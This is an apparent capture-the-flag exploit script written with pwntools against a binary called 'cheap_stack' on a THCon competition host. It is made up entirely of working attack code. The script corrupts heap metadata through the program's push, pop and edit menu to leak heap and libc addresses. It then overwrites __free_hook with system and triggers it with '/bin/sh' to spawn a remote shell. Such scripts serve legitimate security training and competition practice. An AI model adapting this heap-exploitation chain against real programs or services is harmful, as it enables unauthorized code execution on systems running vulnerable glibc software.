from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './cheap_stack'
HOST = 'remote1.thcon.party'
PORT = 10903

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		# return process(TARGET)
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def push(val):
	r.sendlineafter('> ', '1')
	r.sendafter(': ', str(val))
def pop():
	r.sendlineafter('> ', '2')

def edit(val):
	r.sendlineafter('> ', '3')
	r.sendafter(': ', str(val))
r = start()
if args.D:
	debug(r, [])
for i in range(8):
	push('A')
push('A'*0x18+p64(0x51))
push(flat(0, 0x51, 0))
push('A'*0x40)
pop()
payload = '\x01'*0x20
edit(payload)
push('aaaaaaaa')
pop()
pop()
r.recvuntil('\x01'*0x20)
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
heap = leak - 0x490
dbg('heap')
push('A'*0x18+p64(0x51))
push('B'*0x38)
push('A'*0x18+flat(0x51, 0, 0x431))
push(flat(1, 2, heap+0x68, 0x51, heap+0x5f0))
push('A'*0x40)

for i in range(16):
	push((p64(0x21)*8)[:-1])
for i in range(17):
	pop()
# r.interactive()
pop()
edit('1'*0x10)
pop()
r.recvuntil('1'*0x10)
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
base = leak - 0x3ebca0
dbg('base')

fh = base + 0x3ed8e8
system = base + 0x4f550

edit(p64(fh-8))
push("/bin/sh\x00"+p64(system))
pop()

r.interactive()
r.close()
